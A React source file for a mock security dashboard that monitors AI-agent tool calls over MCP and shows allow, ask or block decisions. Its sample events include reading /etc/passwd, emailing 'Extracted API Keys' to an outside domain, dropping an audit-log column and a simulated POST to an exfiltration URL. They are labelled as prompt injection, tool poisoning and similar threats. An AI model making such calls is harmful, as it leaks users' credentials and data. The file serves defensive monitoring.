import React, { useState } from 'react';

export type Decision = 'ALLOW' | 'ASK' | 'BLOCK';
export type FingerprintStatus = 'MATCH' | 'MISMATCH' | 'QUARANTINED';

export interface SecurityEvent {
  id: string;
  timestamp: string;
  tool: string;
  serverName: string;
  arguments: Record<string, unknown>;
  userIntent: string;
  intentMatch: boolean;
  riskScore: number;
  decision: Decision;
  reason: string;
  threatType?: 'Prompt Injection' | 'Tool Poisoning' | 'Rug Pull' | 'Cross-Tool Exfiltration';
  fingerprint: {
    expected: string;
    current: string;
    status: FingerprintStatus;
  };
}

const INITIAL_EVENTS: SecurityEvent[] = [
  {
    id: 'evt-001',
    timestamp: '14:32:01',
    tool: 'read_file',
    serverName: 'filesystem-server',
    arguments: { path: '/etc/passwd' },
    userIntent: 'Read local configuration files',
    intentMatch: false,
    riskScore: 88,
    decision: 'BLOCK',
    reason: 'Path traversal attempt targeting sensitive credentials.',
    threatType: 'Prompt Injection',
    fingerprint: {
      expected: 'sha256-a9f4c3...',
      current: 'sha256-a9f4c3...',
      status: 'MATCH'
    }
  },
  {
    id: 'evt-002',
    timestamp: '14:31:45',
    tool: 'execute_sql',
    serverName: 'db-mcp-connector',
    arguments: { query: 'SELECT * FROM users WHERE active = 1' },
    userIntent: 'Retrieve active subscriber metrics',
    intentMatch: true,
    riskScore: 12,
    decision: 'ALLOW',
    reason: 'Tool execution aligns with validated user prompt intent.',
    fingerprint: {
      expected: 'sha256-e82b11...',
      current: 'sha256-e82b11...',
      status: 'MATCH'
    }
  },
  {
    id: 'evt-003',
    timestamp: '14:30:10',
    tool: 'send_email',
    serverName: 'mail-mcp',
    arguments: { to: 'external@suspicious-domain.com', body: 'Extracted API Keys' },
    userIntent: 'Draft summary email to client',
    intentMatch: false,
    riskScore: 95,
    decision: 'BLOCK',
    reason: 'Unauthorized outbound data exfiltration attempt detected.',
    threatType: 'Cross-Tool Exfiltration',
    fingerprint: {
      expected: 'sha256-c77d90...',
      current: 'sha256-x00b99...',
      status: 'MISMATCH'
    }
  },
  {
    id: 'evt-004',
    timestamp: '14:28:22',
    tool: 'update_schema',
    serverName: 'legacy-db-tool',
    arguments: { table: 'orders', alter: 'DROP COLUMN audit_logs' },
    userIntent: 'Clean up temporary table cache',
    intentMatch: false,
    riskScore: 65,
    decision: 'ASK',
    reason: 'Destructive database action requires explicit confirmation.',
    threatType: 'Tool Poisoning',
    fingerprint: {
      expected: 'sha256-f44e12...',
      current: 'UNKNOWN',
      status: 'QUARANTINED'
    }
  }
];

export default function App() {
  const [events, setEvents] = useState<SecurityEvent[]>(INITIAL_EVENTS);
  const [selectedEventId, setSelectedEventId] = useState<string>(INITIAL_EVENTS[0].id);
  const [guardEnabled, setGuardEnabled] = useState<boolean>(true);

  const selectedEvent = events.find((e) => e.id === selectedEventId) || events[0];
  const quarantinedEvents = events.filter((e) => e.fingerprint.status !== 'MATCH');

  const totalCount = events.length;
  const blockedCount = events.filter((e) => e.decision === 'BLOCK').length;
  const askCount = events.filter((e) => e.decision === 'ASK').length;
  const allowCount = events.filter((e) => e.decision === 'ALLOW').length;

  const triggerMockAttack = () => {
    const newId = `evt-${Date.now().toString().slice(-3)}`;
    const newTimestamp = new Date().toLocaleTimeString();
    const attackEvent: SecurityEvent = {
      id: newId,
      timestamp: newTimestamp,
      tool: 'http_request',
      serverName: 'web-fetch-mcp',
      arguments: { url: 'https://exfiltrate.io/upload', method: 'POST' },
      userIntent: 'Summarize web article',
      intentMatch: false,
      riskScore: 94,
      decision: guardEnabled ? 'BLOCK' : 'ALLOW',
      reason: guardEnabled 
        ? 'Prevented unapproved connection to untrusted endpoint.' 
        : 'Guard bypassed: Event allowed under manual override.',
      threatType: 'Rug Pull',
      fingerprint: {
        expected: 'sha256-77a11f...',
        current: 'sha256-999999...',
        status: 'MISMATCH'
      }
    };

    setEvents((prev) => [attackEvent, ...prev]);
    setSelectedEventId(newId);
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#0a0a0a', color: '#e5e5e5', display: 'flex', flexDirection: 'column' }}>
      <header style={{ borderBottom: '1px solid #262626', padding: '16px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#121212' }}>
        <div>
          <h1 style={{ fontSize: '18px', fontWeight: 700, letterSpacing: '0.05em', margin: 0, textTransform: 'uppercase', color: '#ffffff' }}>
            MCP SENTINEL // CONTROL
          </h1>
          <span style={{ fontSize: '12px', color: '#737373' }}>AIR-GAPPED THREAT MONITOR & GUARD ENGINE</span>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <button 
            onClick={triggerMockAttack}
            style={{ backgroundColor: '#262626', border: '1px solid #404040', color: '#ffffff', padding: '6px 12px', borderRadius: '4px', fontSize: '12px', cursor: 'pointer', textTransform: 'uppercase', fontWeight: 600 }}
          >
            + Simulate Attack
          </button>
          
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderLeft: '1px solid #262626', paddingLeft: '16px' }}>
            <span style={{ fontSize: '12px', fontWeight: 600, color: guardEnabled ? '#ffffff' : '#737373' }}>
              GUARD MODE: {guardEnabled ? 'ACTIVE' : 'BYPASSED'}
            </span>
            <button
              onClick={() => setGuardEnabled(!guardEnabled)}
              style={{
                width: '40px',
                height: '20px',
                backgroundColor: guardEnabled ? '#ffffff' : '#262626',
                borderRadius: '10px',
                border: '1px solid #404040',
                position: 'relative',
                cursor: 'pointer'
              }}
            >
              <div style={{
                width: '14px',
                height: '14px',
                backgroundColor: guardEnabled ? '#0a0a0a' : '#ffffff',
                borderRadius: '50%',
                position: 'absolute',
                top: '2px',
                left: guardEnabled ? '22px' : '2px'
              }} />
            </button>
          </div>
        </div>
      </header>

      <div style={{ flex: 1, padding: '24px', display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '1600px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px' }}>
          {[
            { label: 'TOTAL EVENTS', val: totalCount },
            { label: 'BLOCKED ACTIONS', val: blockedCount },
            { label: 'PROMPT CONFIRMATIONS', val: askCount },
            { label: 'PASSED EXECUTION', val: allowCount }
          ].map((stat, i) => (
            <div key={i} style={{ backgroundColor: '#121212', border: '1px solid #262626', padding: '16px', borderRadius: '4px' }}>
              <div style={{ fontSize: '11px', color: '#737373', letterSpacing: '0.05em', fontWeight: 600 }}>{stat.label}</div>
              <div style={{ fontSize: '24px', fontWeight: 700, marginTop: '4px', color: '#ffffff' }}>{stat.val}</div>
            </div>
          ))}
        </div>

        {quarantinedEvents.length > 0 && (
          <div style={{ backgroundColor: '#171717', border: '1px solid #404040', borderRadius: '4px', padding: '12px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ backgroundColor: '#ffffff', color: '#0a0a0a', fontSize: '10px', fontWeight: 800, padding: '2px 6px', borderRadius: '2px' }}>ALERT</span>
              <span style={{ fontSize: '13px', color: '#e5e5e5' }}>
                <strong>Fingerprint Mismatch Detected:</strong> {quarantinedEvents.length} tool call(s) failed hash validation or are quarantined.
              </span>
            </div>
            <span style={{ fontSize: '11px', color: '#737373', fontFamily: 'monospace' }}>STATUS: FINGERPRINT_QUARANTINE</span>
          </div>
        )}

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', flex: 1 }}>
          <div style={{ backgroundColor: '#121212', border: '1px solid #262626', borderRadius: '4px', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            <div style={{ borderBottom: '1px solid #262626', padding: '12px 16px', fontSize: '12px', fontWeight: 700, color: '#a3a3a3', letterSpacing: '0.05em' }}>
              LIVE EVENT / TOOL-CALL FEED
            </div>
            <div style={{ flex: 1, overflowY: 'auto' }}>
              {events.map((evt) => {
                const isSelected = evt.id === selectedEventId;
                return (
                  <div
                    key={evt.id}
                    onClick={() => setSelectedEventId(evt.id)}
                    style={{
                      padding: '12px 16px',
                      borderBottom: '1px solid #1a1a1a',
                      cursor: 'pointer',
                      backgroundColor: isSelected ? '#1f1f1f' : 'transparent',
                      borderLeft: isSelected ? '3px solid #ffffff' : '3px solid transparent'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                      <span style={{ fontSize: '13px', fontWeight: 600, color: '#ffffff', fontFamily: 'monospace' }}>{evt.tool}</span>
                      <span style={{ fontSize: '11px', color: '#737373' }}>{evt.timestamp}</span>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px', color: '#a3a3a3' }}>
                      <span>{evt.serverName}</span>
                      <span style={{
                        padding: '1px 6px',
                        borderRadius: '2px',
                        fontSize: '10px',
                        fontWeight: 700,
                        border: '1px solid #404040',
                        backgroundColor: evt.decision === 'BLOCK' ? '#262626' : evt.decision === 'ASK' ? '#1a1a1a' : '#0f0f0f',
                        color: evt.decision === 'BLOCK' ? '#ffffff' : '#d4d4d4'
                      }}>
                        {evt.decision}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          <div style={{ backgroundColor: '#121212', border: '1px solid #262626', borderRadius: '4px', padding: '20px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
            <div style={{ borderBottom: '1px solid #262626', paddingBottom: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <span style={{ fontSize: '11px', color: '#737373', letterSpacing: '0.05em', fontWeight: 600 }}>EVENT INSPECTOR</span>
                <h2 style={{ fontSize: '16px', fontWeight: 700, margin: '2px 0 0 0', fontFamily: 'monospace', color: '#ffffff' }}>{selectedEvent.id}</h2>
              </div>
              <div style={{ textAlign: 'right' }}>
                <span style={{ fontSize: '11px', color: '#737373' }}>RISK SCORE</span>
                <div style={{ fontSize: '18px', fontWeight: 700, color: selectedEvent.riskScore > 50 ? '#ffffff' : '#a3a3a3' }}>
                  {selectedEvent.riskScore} / 100
                </div>
              </div>
            </div>

            <div style={{ backgroundColor: '#0a0a0a', border: '1px solid #262626', padding: '12px', borderRadius: '4px' }}>
              <div style={{ fontSize: '11px', color: '#737373', fontWeight: 600, marginBottom: '4px' }}>EVALUATED USER INTENT</div>
              <div style={{ fontSize: '13px', color: '#e5e5e5' }}>"{selectedEvent.userIntent}"</div>
              <div style={{ marginTop: '8px', fontSize: '11px', color: selectedEvent.intentMatch ? '#a3a3a3' : '#ffffff', fontWeight: 600 }}>
                INTENT ALIGNMENT: {selectedEvent.intentMatch ? 'MATCHED' : 'UNSANCTIONED DISCREPANCY DETECTED'}
              </div>
            </div>

            <div>
              <div style={{ fontSize: '11px', color: '#737373', fontWeight: 600, marginBottom: '4px' }}>EVALUATION & REASON</div>
              <p style={{ fontSize: '13px', color: '#d4d4d4', margin: 0, lineHeight: 1.5 }}>{selectedEvent.reason}</p>
              {selectedEvent.threatType && (
                <div style={{ marginTop: '8px', fontSize: '11px', display: 'inline-block', backgroundColor: '#262626', border: '1px solid #404040', padding: '2px 8px', borderRadius: '2px', color: '#ffffff' }}>
                  CLASSIFICATION: {selectedEvent.threatType.toUpperCase()}
                </div>
              )}
            </div>

            <div style={{ borderTop: '1px solid #262626', paddingTop: '16px' }}>
              <div style={{ fontSize: '11px', color: '#737373', fontWeight: 600, marginBottom: '8px' }}>PROVENANCE & FINGERPRINT VALIDATION</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', fontSize: '12px', fontFamily: 'monospace', backgroundColor: '#0a0a0a', padding: '12px', border: '1px solid #262626', borderRadius: '4px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#737373' }}>Expected Hash:</span>
                  <span>{selectedEvent.fingerprint.expected}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#737373' }}>Current Hash:</span>
                  <span style={{ color: selectedEvent.fingerprint.status === 'MATCH' ? '#e5e5e5' : '#ffffff' }}>{selectedEvent.fingerprint.current}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px dashed #262626', paddingTop: '6px', marginTop: '2px' }}>
                  <span style={{ color: '#737373' }}>Status:</span>
                  <span style={{ fontWeight: 700 }}>{selectedEvent.fingerprint.status}</span>
                </div>
              </div>
            </div>

            <div style={{ flex: 1 }}>
              <div style={{ fontSize: '11px', color: '#737373', fontWeight: 600, marginBottom: '6px' }}>TOOL ARGUMENTS PAYLOAD</div>
              <pre style={{ backgroundColor: '#0a0a0a', border: '1px solid #262626', padding: '12px', borderRadius: '4px', fontSize: '11px', color: '#d4d4d4', overflowX: 'auto', margin: 0 }}>
                {JSON.stringify(selectedEvent.arguments, null, 2)}
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
